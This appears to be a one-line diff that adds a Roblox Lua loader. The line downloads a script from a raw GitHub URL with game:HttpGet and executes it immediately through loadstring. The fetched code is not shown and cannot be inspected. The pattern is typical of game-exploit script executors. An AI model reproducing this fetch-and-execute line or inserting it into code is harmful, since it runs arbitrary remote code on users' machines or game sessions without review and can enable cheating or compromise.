@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/R-shii/reg2/main/reg.lua'))()
